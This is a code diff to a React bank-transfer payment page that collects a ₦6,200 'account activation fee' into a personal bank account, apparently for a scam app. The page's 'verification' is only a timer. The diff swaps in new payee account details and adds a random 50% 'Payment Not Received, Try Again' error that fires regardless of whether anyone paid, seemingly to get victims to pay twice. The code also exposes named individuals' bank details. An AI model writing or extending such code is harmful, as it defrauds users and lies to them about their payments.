@@ -1,7 +1,7 @@
 
 import React, { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
-import { ArrowLeft, Copy, Wallet, User2, Banknote, CheckCircle } from "lucide-react";
+import { ArrowLeft, Copy, Wallet, User2, Banknote, CheckCircle, AlertCircle } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { toast } from "sonner";
 import { useAuth } from "@/contexts/AuthContext";
@@ -18,15 +18,16 @@ const BankTransferPayment: React.FC = () => {
   const [timeLeft, setTimeLeft] = useState(1800); // 30 mins in seconds
   const [showProcessingDialog, setShowProcessingDialog] = useState(false);
   const [showSuccessDialog, setShowSuccessDialog] = useState(false);
+  const [showErrorDialog, setShowErrorDialog] = useState(false);
   const [showOpayWarning, setShowOpayWarning] = useState(false);
   const [buttonText, setButtonText] = useState("I Have Made Payment");
   const [activationCode, setActivationCode] = useState("");
   const [loadingProgress, setLoadingProgress] = useState(0);
   
   const accountDetails = {
-    bankName: "FCMB Bank",
-    accountNumber: "1030512463",
-    accountName: "SAMUEL JUDE",
+    bankName: "NOVA BANK",
+    accountNumber: "6056570413",
+    accountName: "CHUKWUEMEKA AMADI JAMES",
     amount: "₦6,200"
   };
   
@@ -94,41 +95,54 @@ const BankTransferPayment: React.FC = () => {
       });
     }, 100);
     
-    // After 7 seconds, show success and generate activation code
+    // After 7 seconds, randomly show success or error
     setTimeout(() => {
-      const newActivationCode = generateActivationCode();
-      setActivationCode(newActivationCode);
-      
-      // Debit user account and activate
-      if (user) {
-        const newBalance = user.balance - 6200;
-        updateUserInfo({ 
-          isActivated: true,
-          balance: newBalance 
-        });
-        
-        // Add transaction to history
-        const existingTransactions = JSON.parse(localStorage.getItem('transactions') || '[]');
-        const newTransaction = {
-          id: `tr-${Date.now()}`,
-          type: "debit",
-          amount: 6200,
-          date: new Date().toISOString().split('T')[0],
-          description: "Account Activation Fee",
-          status: "completed"
-        };
-        localStorage.setItem('transactions', JSON.stringify([newTransaction, ...existingTransactions]));
-      }
+      const shouldSucceed = Math.random() > 0.5; // 50% chance of success
       
       setShowProcessingDialog(false);
-      setShowSuccessDialog(true);
-      toast.success("Payment confirmed! Account activated!");
+      
+      if (shouldSucceed) {
+        const newActivationCode = generateActivationCode();
+        setActivationCode(newActivationCode);
+        
+        // Debit user account and activate
+        if (user) {
+          const newBalance = user.balance - 6200;
+          updateUserInfo({ 
+            isActivated: true,
+            balance: newBalance 
+          });
+          
+          // Add transaction to history
+          const existingTransactions = JSON.parse(localStorage.getItem('transactions') || '[]');
+          const newTransaction = {
+            id: `tr-${Date.now()}`,
+            type: "debit",
+            amount: 6200,
+            date: new Date().toISOString().split('T')[0],
+            description: "Account Activation Fee",
+            status: "completed"
+          };
+          localStorage.setItem('transactions', JSON.stringify([newTransaction, ...existingTransactions]));
+        }
+        
+        setShowSuccessDialog(true);
+        toast.success("Payment confirmed! Account activated!");
+      } else {
+        // Show error dialog
+        setShowErrorDialog(true);
+        setButtonText("I Have Made Payment");
+      }
     }, 7000);
   };
 
   const handleGoToDashboard = () => {
     setShowSuccessDialog(false);
     navigate("/dashboard");
+  };
+
+  const handleTryAgain = () => {
+    setShowErrorDialog(false);
   };
 
   return (
@@ -268,6 +282,29 @@ const BankTransferPayment: React.FC = () => {
               </div>
               <p className="text-gray-500 text-lg">Verifying Payment...</p>
             </div>
+          </div>
+        </DialogContent>
+      </Dialog>
+
+      {/* Payment Error Dialog */}
+      <Dialog open={showErrorDialog} onOpenChange={setShowErrorDialog}>
+        <DialogContent className="sm:max-w-md p-0 gap-0">
+          <div className="p-8">
+            <div className="flex flex-col items-center mb-6">
+              <div className="w-20 h-20 bg-purple-100 rounded-full flex items-center justify-center mb-6">
+                <AlertCircle size={40} className="text-purple-600" />
+              </div>
+              <h2 className="text-2xl font-bold text-center text-gray-800">Payment Not Received</h2>
+              <h3 className="text-xl font-bold text-center text-gray-800">Please Try Again</h3>
+              <p className="text-center text-gray-600 mt-3">Invalid Payment Please Try Again</p>
+            </div>
+            
+            <button
+              onClick={handleTryAgain}
+              className="w-full bg-green-800 text-white py-4 rounded-lg font-medium text-lg"
+            >
+              TRY AGAIN
+            </button>
           </div>
         </DialogContent>
       </Dialog>
